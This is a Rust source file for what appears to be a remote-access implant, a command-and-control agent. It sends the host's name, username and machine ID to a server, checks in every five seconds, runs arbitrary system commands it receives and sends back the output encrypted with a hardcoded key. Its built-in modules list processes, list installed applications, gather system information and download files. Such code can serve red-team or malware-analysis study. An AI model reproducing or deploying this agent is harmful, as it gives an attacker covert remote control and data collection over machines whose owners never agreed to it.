use commands::{
    download::DownloadCommandExecutor,
    installed_applications::InstalledApplicationsCommandExecutor,
    kill_agent::KillAgentCommandExecutor, processlist::ProcessListCommandExecutor,
    sysinfo::SysinfoCommandExecutor,
};
use orion::aead::{seal, SecretKey};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::error::Error;
use std::io::{self, ErrorKind, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Output};
use std::thread;
use std::time::Duration;
use whoami::username;

extern crate machine_uid;
extern crate serde_json;

use hostname::get as get_hostname;
use machine_uid::get as get_machine_id;

mod commands {
    pub mod download;
    pub mod installed_applications;
    pub mod kill_agent;
    pub mod processlist;
    pub mod sysinfo;
}

pub trait CommandExecutor {
    fn execute(&self, args: &str, data: &mut HashMap<String, String>) -> Result<String, io::Error>;
}

const SERVER_IP: &str = "127.0.0.1";
const SERVER_PORT: u16 = 8000;

fn connect_to_server() -> Result<TcpStream, io::Error> {
    TcpStream::connect(format!("{}:{}", SERVER_IP, SERVER_PORT))
}

fn send_message(
    stream: &mut TcpStream,
    message: &mut Value,
    secret_key: &SecretKey,
) -> Result<(), io::Error> {
    if let Ok(machine_id) = get_machine_id() {
        if let Value::Object(ref mut map) = message {
            map.insert("id".to_string(), json!(machine_id));
        }

        let json_data = serde_json::to_string(&message)?;

        // Encrypt the JSON data
        let ciphertext_result = seal(secret_key, json_data.as_bytes());
        match ciphertext_result {
            Ok(ciphertext_bytes) => {
                stream.write_all(&ciphertext_bytes)?;
                Ok(())
            }
            Err(e) => {
                // Convert the error to a std::io::Error with a custom message
                Err(io::Error::new(
                    io::ErrorKind::Other,
                    format!("Failed to seal message: {}", e),
                ))
            }
        }
    } else {
        Err(io::Error::new(
            io::ErrorKind::Other,
            "Unable to retrieve machine ID".to_string(),
        ))
    }
}

fn read_response(stream: &mut TcpStream) -> Result<String, io::Error> {
    let mut buffer = [0; 500000];
    let bytes_read = stream.read(&mut buffer)?;
    if bytes_read == 0 {
        return Err(io::Error::new(
            ErrorKind::UnexpectedEof,
            "Connection closed by remote end",
        ));
    }
    let response_original = String::from_utf8_lossy(&buffer[..bytes_read]);
    let response = response_original.trim_matches(char::from(0));
    Ok(response.to_string())
}

fn execute_system_command(command_value: &str) -> Result<String, io::Error> {
    let output = execute_command(command_value)?;
    let trimmed_output = String::from_utf8_lossy(&output.stdout).trim().to_string();
    debug(format!("COMMAND OUTPUT: {}", trimmed_output));
    Ok(trimmed_output)
}

fn execute_builtin_command(
    command_value: &str,
    data: &mut HashMap<String, String>,
) -> Result<String, io::Error> {
    match command_value {
        "kill_agent" => {
            let executor = KillAgentCommandExecutor;
            executor.execute(command_value, data)
        }
        "download" => {
            let executor = DownloadCommandExecutor;
            executor.execute(command_value, data)
        }
        "sysinfo" => {
            let executor = SysinfoCommandExecutor;
            executor.execute(command_value, data)
        }
        "processlist" => {
            let executor = ProcessListCommandExecutor;
            executor.execute(command_value, data)
        }
        "installed_applications" => {
            let executor = InstalledApplicationsCommandExecutor;
            executor.execute(command_value, data)
        }
        _ => Err(io::Error::new(ErrorKind::Other, "Unknown module")),
    }
}

fn main() -> Result<(), Box<dyn Error>> {
    let secret_key: [u8; 32] = [
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E,
        0x1F, 0x20,
    ];
    let secret_key = SecretKey::from_slice(&secret_key)?;

    if let Ok(hostnames) = get_hostname() {
        let mut message = json!({
            "action": "register",
            "computer_name": hostnames.to_str().unwrap(),
            "username": username(),
        });

        match connect_to_server() {
            Ok(mut stream) => {
                send_message(&mut stream, &mut message, &secret_key)?;

                let response = read_response(&mut stream)?;
                debug(format!("Server response: {}", response));
            }
            Err(e) => {
                eprintln!("Error connecting to server: {}", e);
            }
        }
    } else {
        eprintln!("Error retrieving hostname");
    }

    loop {
        match connect_to_server() {
            Ok(mut stream) => {
                let mut message = json!({
                    "action": "ping"
                });

                send_message(&mut stream, &mut message, &secret_key)?;

                let response = read_response(&mut stream)?;
                debug(format!("Server response: {}", response));

                match serde_json::from_str::<Value>(&response) {
                    Ok(parsed_response) => {
                        debug(format!("Parsed response: {:?}", parsed_response));

                        if let Some(error_value) =
                            parsed_response.get("error").and_then(|v| v.as_str())
                        {
                            if error_value == "no_agent" {
                                if let Ok(hostnames) = get_hostname() {
                                    let mut message = json!({
                                        "action": "register",
                                        "computer_name": hostnames.to_str().unwrap(),
                                        "username": username(),
                                    });

                                    match connect_to_server() {
                                        Ok(mut stream) => {
                                            send_message(&mut stream, &mut message, &secret_key)?;

                                            let response = read_response(&mut stream)?;
                                            debug(format!("Server response: {}", response));
                                        }
                                        Err(e) => {
                                            eprintln!("Error connecting to server: {}", e);
                                        }
                                    }
                                } else {
                                    println!("Error: Unable to retrieve hostname");
                                }
                            } else {
                                println!("Server error: {}", error_value);
                            }
                        } else if let Some(commands) =
                            parsed_response.get("commands").and_then(|v| v.as_array())
                        {
                            for command in commands {
                                print!("{:?}", command);
                                if let Some(command_type) =
                                    command.get("command_type").and_then(|v| v.as_str())
                                {
                                    if command_type == "system" {
                                        if let Some(command_value) =
                                            command.get("command").and_then(|v| v.as_str())
                                        {
                                            debug(String::from("Executing system command"));
                                            match execute_system_command(command_value) {
                                                Ok(output) => {
                                                    let mut response = json!({
                                                        "action": "commandResult",
                                                        "command": command_value,
                                                        "result": "success",
                                                        "output": output,
                                                    });

                                                    send_message(
                                                        &mut stream,
                                                        &mut response,
                                                        &secret_key,
                                                    )?;
                                                }
                                                Err(error) => {
                                                    eprintln!(
                                                        "Error executing system command: {:?}",
                                                        error
                                                    );
                                                }
                                            }
                                        }
                                    } else if command_type == "builtin" {
                                        if let Some(command_value) =
                                            command.get("command").and_then(|v| v.as_str())
                                        {
                                            if let Some(data) =
                                                command.get("data").and_then(|v| v.as_object())
                                            {
                                                let mut map = HashMap::new();

                                                for (key, value) in data {
                                                    if let Some(value_str) = value.as_str() {
                                                        map.insert(
                                                            key.to_string(),
                                                            value_str.to_string(),
                                                        );
                                                    } else {
                                                        // Handle the case where the value is not a string (optional)
                                                        // You can add custom logic here if needed.
                                                    }
                                                }

                                                debug(String::from("Executing built-in command"));
                                                match execute_builtin_command(
                                                    command_value,
                                                    &mut map,
                                                ) {
                                                    Ok(output) => {
                                                        let mut response = json!({
                                                            "action": "commandResult",
                                                            "command": command_value,
                                                            "result": "success",
                                                            "output": output,
                                                        });

                                                        send_message(
                                                            &mut stream,
                                                            &mut response,
                                                            &secret_key,
                                                        )?;
                                                    }
                                                    Err(error) => {
                                                        eprintln!("Error executing built-in command '{}': {:?}", command_value, error);
                                                    }
                                                }
                                            }
                                        } else {
                                            println!("No module specified for the command");
                                        }
                                    }
                                } else {
                                    println!("No valid command given!");
                                }
                            }
                        }
                    }
                    Err(error) => {
                        eprintln!(
                            "Error parsing JSON response: {:?}, JSON: {:?}",
                            error, response
                        );
                    }
                }
            }
            Err(e) => {
                eprintln!("Error connecting to server: {}", e);
            }
        }

        thread::sleep(Duration::from_secs(5));
    }
}

fn execute_command(command_string: &str) -> Result<Output, io::Error> {
    let mut parts = command_string.split_whitespace();
    let cmd_name = parts
        .next()
        .ok_or(io::Error::new(ErrorKind::InvalidInput, "Command is empty"))?;

    let mut cmd = Command::new(cmd_name);

    for part in parts {
        cmd.arg(part);
    }

    let output = cmd.output()?;
    Ok(output)
}

fn debug(message: String) {
    #[cfg(debug_assertions)]
    println!("DEBUG: {}", message);
}
